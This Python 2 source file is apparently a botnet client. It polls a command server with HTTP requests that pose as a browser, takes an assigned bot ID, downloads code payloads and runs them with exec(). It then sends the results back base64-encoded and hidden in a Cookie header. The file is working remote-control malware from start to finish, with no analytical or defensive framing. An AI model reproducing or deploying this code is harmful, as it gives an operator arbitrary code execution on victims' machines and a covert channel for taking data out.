from socket import *
import os
import urllib2
import platform
import cPickle
import time
import base64
from subprocess import call
import sys, signal

PORT = ('localhost', 80)
ID = ''

def isInt(s):
    try:
        int(s)
        return True
    except ValueError:
        return False

def check_url():
    try:
        global ID
        sock = socket()
        sock.connect(PORT)
        Action = ''
        request = 'GET /' + ID + Action + ' HTTP/1.1\nAccept-Encoding: identity\nHost: ' + PORT[0] + ":" + str(PORT[1]) + '\nConnection: close\nUser-Agent: Mozilla/5.0 (X11)'
        sock.send(request)
        rec = sock.recv(1024)
        rec = rec.split('text/html\n', 1)[1]
        received = rec.split(';')
        print rec
        if rec == 'Nada':
            sock.close()
            return ''
        #If bot goes to '/' create new bot on server
        if not isInt(received[0]):
            print "New id will be: " + received[0]
            ID = received[0]
            print "Setting Unique Id to: " + ID
            received = received[1:]
        #If bot went to existing url
        length = int(received[0])
        remaining = length - len(received[2])
        payloadId = received[1]
        total_data = received[2]
        while remaining > 0:
            data = sock.recv(1024)
            if not data: break
            total_data += data
            remaining = remaining - len(data)
        sock.close()
        return payloadId + ";" + total_data
    except:
        print "Unexpected Exception in check_url"
        return ''
    
def send_results(command):
    try:
        script = ''
        if ';' in command:
            s = command.split(';')
            script = s[0]
            command = s[1]
        print "Hello"
        print "Command is: " + command
        print "Before Execute: " + script
        exec(command)
        res = execute()
        print "After Execute"
        res = cPickle.dumps(res)
        res = base64.b64encode(res)
        print "After Encode"
        Action = '/r/'
        request = 'GET /' + ID + Action + ' HTTP/1.1\nAccept-Encoding: identity\nHost: ' + PORT[0] + ":" + str(PORT[1]) + '\nCookie: _res=' + res  +' ' + '_src=' + script  + ' \nConnection: close\nUser-Agent: Mozilla/5.0 (X11)'
        print request
        sock = socket()
        sock.connect(PORT)
        sock.send(request)
        sock.close()
    except Exception, e:
        print "Unexpected Exception in send_results: " + str(e)

def main():
    while True:
        r = check_url()
        if r == '':
            time.sleep(10)
        else:
            send_results(r)
            time.sleep(5)
def signal_handler(signal, frame):
    print "Shutting down."
    sys.exit(0)
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
